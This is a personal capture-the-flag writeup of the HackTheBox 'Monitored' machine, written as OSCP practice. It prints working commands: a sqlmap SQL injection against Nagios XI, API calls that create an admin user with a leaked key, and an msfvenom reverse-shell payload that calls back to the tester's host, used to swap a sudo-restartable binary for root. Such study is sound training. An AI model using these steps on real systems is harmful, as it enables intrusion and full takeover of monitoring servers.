---
layout: writeup
title: Monitored - HackTheBox
date: 2024-10-29 13:32:20 +0300
description: A Writeup of the Monitored Box from HackTheBox
image: # /assets/images/Monitored/Monitored.png
fig-caption: # Add figcaption (optional)
tags: [TJ Null, LainKusanagi, Linux]
---

Today I'm doing a writeup for a [Hack The Box](https://app.hackthebox.com/profile/2013658) box from both TJ Null’s OSCP [lab prep list](https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#)and LainKusanagi’s [list of OSCP like machines](https://www.reddit.com/r/oscp/comments/1c8pzyz/lainkusanagi_list_of_oscp_like_machines/). It is called Monitored, and it is rated Medium by HackTheBox. As usual, we get started with an nmap scan. I'm using my own [custom script](https://github.com/pentestpop/verybasicenum/blob/main/vbnmap.sh) for this which (gives more detail but) shows these open ports:

```
PORT    STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
389/tcp  open  ldap
443/tcp  open  https
5667/tcp open  tcpwrapped
```

Crucially, my custom script also runs a UDP scan so that I don't forget. It returns these ports:
```
PORT      STATE         SERVICE
123/udp   open          ntp
161/udp   open          snmp
```

So we have ssh, ldap, a couple of web ports, ntp, snmp, and an open port on 5667 which turns out to be for Nagios, which is related to port 443: 

![Screenshot 2024-10-31 at 5.08.03 PM.png](/assets/images/Monitored/Screenshot 2024-10-31 at 5.08.03 PM.png){: .responsive-image}

That said, when I see snmp on a box like that, I know we should probably check it out. I try a few different things here trying to find something interesting, but I ultimately run this command and wind up picking through the output: `or community in public private manager; do snmpwalk -c $community -v1 10.10.11.248; done`. It does kind of pay off though because I find an interesting section here:

![Screenshot 2024-10-31 at 5.26.10 PM.png](/assets/images/Monitored/Screenshot 2024-10-31 at 5.26.10 PM.png){: .responsive-image}

It looks like a password is being passed to the svc user. I try to check what kind of password it could be with `nth`, and it responds `Cisco-PIX MD5` or `Cisco-ASA(MD5)`, but it doesn't crack for either. Crackstation doesn't show anything, nor does base64. I also can't use it to log in on Nagios, so at least I don't go too far down that hole.  

![Screenshot 2024-10-31 at 5.43.46 PM.png](/assets/images/Monitored/Screenshot 2024-10-31 at 5.43.46 PM.png){: .responsive-image}

I also can't use it for ssh, not for the svc user anyway, and the snmap service does not return any users when I attempt to query the user account OID (`1.3.6.1.4.1.77.1.2.25`). But interesting, when I use a different user and/or password, the response is `Invalid username or password`. So I suspect the `svc` account does exit, but maybe it has been disabled. It also means that the credentials are correct. 

When I search exploit-db for `Nagios XI`, I find a number of exploits. It's seem like maybe we could be able to use one of them, but I tried some, and it doesn't look like they were. I get `Login ... Failed!` from [this one](https://www.exploit-db.com/exploits/49422), because it is after all trying to login with the `login.php` page, but that's the one we're already trying. 

There is an API we can try, but the documentation isn't great. I find a reference to an `authenticate` endpoint [here](https://support.nagios.com/forum/viewtopic.php?p=336355&hilit=%2Fapi%2Fv1%2Fauthenticate#p336355) . I try the command referenced here `curl -XPOST "https://nagios.monitored.htb/nagiosxi/api/v1/authenticate?pretty=1" -d "username=svc&=XjH7VCehowpR1xZB&valid_min=15" -k -v` and with a GET request as well, but I can't seem to authenticate, and I learn that we can only use the POST request. Then I realize I left out the password parameter title in the curl command above. I try again (`curl -XPOST "https://nagios.monitored.htb/nagiosxi/api/v1/authenticate?pretty=1" -d "username=svc&password=XjH7VCehowpR1xZB&valid_min=15" -k -v`), and I get this response:

![Screenshot 2024-10-31 at 9.49.29 PM.png](/assets/images/Monitored/Screenshot 2024-10-31 at 9.49.29 PM.png){: .responsive-image}

So we have an authentication token at least. I'm not really sure what to do with that, but when I Google `nagiosxi token /api/v1/authenticate`, I actually see [this exploit](https://www.exploit-db.com/exploits/51925O)from exploit-db. And it contains this line:

![Screenshot 2024-10-31 at 9.58.49 PM.png](/assets/images/Monitored/Screenshot 2024-10-31 at 9.58.49 PM.png){: .responsive-image}

So I just enter this enter my browser: `http://nagios.monitored.htb/nagiosxi/login.php?token=43514b34eea3d838361f57bc116e6132428ad8fa`, and I get in!

![Screenshot 2024-10-31 at 10.00.23 PM.png](/assets/images/Monitored/Screenshot 2024-10-31 at 10.00.23 PM.png){: .responsive-image}

Not in the screenshot, but the footer shows that we are working with `Nagios 5.11.0`. When we google that, we see there are a [couple CVE's](https://www.tenable.com/plugins/nessus/181758) for SQL injection, and googling 
"CVE-2023-40931" returns [this PoC](https://github.com/sealldeveloper/CVE-2023-40931-PoC). If we replace our relevant parameters, the full command is:

```
sqlmap -D nagiosxi -T xi_users -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3&token=`curl -ksX POST https://nagios.monitored.htb/nagiosxi/api/v1/authenticate -d "username=svc&password=XjH7VCehowpR1xZB&valid_min=1000" | awk -F'"' '{print$12}'`" --dump --level 4 --risk 3 -p id --batch
```

This dumps the `xi_users` table which shows us the users, their bcrypt encrypted passwords, and their API keys. This includes `svc` which is disabled, but it also includes `nagiosadmin`. I try to crack the `nagiosadmin` encrypted password, but I don't get anything back. So we know there are authenticated RCEs, but they require us to login normally. Now that we have the high-privilege API key (`IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL`, maybe we can change a password, enable the `svc` user, or create a new user. When I google "nagios api create user", I find [this](https://support.nagios.com/forum/viewtopic.php?t=42923) forum post with what appears to be the perfect command for me. I adjust it for my own use and run `curl -XPOST "http://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1" -d "username=poppop&password=party1&name=Pop%20Pop&email=pop@pop.com"` which returns these results:

![Screenshot 2024-10-31 at 11.08.39 PM.png](/assets/images/Monitored/Screenshot 2024-10-31 at 11.08.39 PM.png){: .responsive-image}

Now I have a `pop` user. With that user, I try running [this](https://www.exploit-db.com/exploits/51925), but it doesn't work, apparently because of the self-signed certificate. So it's not going to work without fixing the SSL issue. I look through it to see if I can manually do it, and maybe I can, but I also see this.

![Screenshot 2024-10-31 at 11.20.51 PM.png](/assets/images/Monitored/Screenshot 2024-10-31 at 11.20.51 PM.png){: .responsive-image}

It looks like there is a `createAdmin` function, that must be required for the command execution. 
![Screenshot 2024-10-31 at 11.23.11 PM.png](/assets/images/Monitored/Screenshot 2024-10-31 at 11.23.11 PM.png){: .responsive-image}

Here we have what we basically already did to create the pop user, but there is another parameter: `"auth_level": "admin"`. If I re-run the command I already did, I should be able to create an admin user myself. This time I ran:
```
$curl -XPOST "http://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1" -d "username=popepop&password=eparty1&name=EPop%20Pop&email=pope@pop.com&auth_level=admin"



{
    "success": "User account popepop was added successfully!",
    "user_id": 7
}

```

And the `popepop` user was created. Now when I log in, I can now see there is an admin page.

![Screenshot 2024-10-31 at 11.26.58 PM.png](/assets/images/Monitored/Screenshot 2024-10-31 at 11.26.58 PM.png){: .responsive-image}

![Screenshot 2024-11-01 at 12.06.44 AM.png](/assets/images/Monitored/Screenshot 2024-11-01 at 12.06.44 AM.png){: .responsive-image}



![Screenshot 2024-10-31 at 11.32.13 PM.png](/assets/images/Monitored/Screenshot 2024-10-31 at 11.32.13 PM.png){: .responsive-image}

It doesn't do anything. But the same `Core Config Manager` had a Hosts page as well. 

![Screenshot 2024-11-01 at 12.07.26 AM.png](/assets/images/Monitored/Screenshot 2024-11-01 at 12.07.26 AM.png){: .responsive-image}

We can edit it, attach the pop_test1 command. And then click `Run Check Command` at the bottom. 
![Screenshot 2024-11-01 at 12.07.57 AM.png](/assets/images/Monitored/Screenshot 2024-11-01 at 12.07.57 AM.png){: .responsive-image}










![Screenshot 2024-10-31 at 11.34.33 PM.png](/assets/images/Monitored/Screenshot 2024-10-31 at 11.34.33 PM.png){: .responsive-image}

When I run `sudo -l`, I get this list of commands I can run with sudo:
```
User nagios may run the following commands on localhost:
    (root) NOPASSWD: /etc/init.d/nagios start
    (root) NOPASSWD: /etc/init.d/nagios stop
    (root) NOPASSWD: /etc/init.d/nagios restart
    (root) NOPASSWD: /etc/init.d/nagios reload
    (root) NOPASSWD: /etc/init.d/nagios status
    (root) NOPASSWD: /etc/init.d/nagios checkconfig
    (root) NOPASSWD: /etc/init.d/npcd start
    (root) NOPASSWD: /etc/init.d/npcd stop
    (root) NOPASSWD: /etc/init.d/npcd restart
    (root) NOPASSWD: /etc/init.d/npcd reload
    (root) NOPASSWD: /etc/init.d/npcd status
    (root) NOPASSWD: /usr/bin/php
        /usr/local/nagiosxi/scripts/components/autodiscover_new.php *
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/send_to_nls.php *
    (root) NOPASSWD: /usr/bin/php
        /usr/local/nagiosxi/scripts/migrate/migrate.php *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/components/getprofile.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/upgrade_to_latest.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/change_timezone.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/reset_config_perms.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_ssl_config.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/backup_xi.sh *
```

`/usr/bin/php` really sticks out there. Everything else could work, but php is a whole language to work with so I check [gtfobins](https://gtfobins.github.io/gtfobins/php/), and I see this:

![Screenshot 2024-10-31 at 11.36.58 PM.png](/assets/images/Monitored/Screenshot 2024-10-31 at 11.36.58 PM.png){: .responsive-image}

That should do it. But it asks for the password because I'm reading the output wrong. I can run `sudo /usr/bin/php`, but only on the listed phps files. Wishful thinking, or wishful not thinking so much I guess. That's ok, still a lot to work with.  

![Screenshot 2024-10-31 at 11.57.22 PM.png](/assets/images/Monitored/Screenshot 2024-10-31 at 11.57.22 PM.png){: .responsive-image}

![Screenshot 2024-10-31 at 11.58.20 PM.png](/assets/images/Monitored/Screenshot 2024-10-31 at 11.58.20 PM.png){: .responsive-image}



`msfvenom -p cmd/unix/reverse_bash LHOST=10.10.14.9 LPORT=4444 -f raw -o shell.sh`
then transfer the file
then replace `/usr/local/nagios/bin/nagios`
`sudo /usr/local/nagiosxi/scripts/manage_services.sh restart nagios`
with my listener on 4444
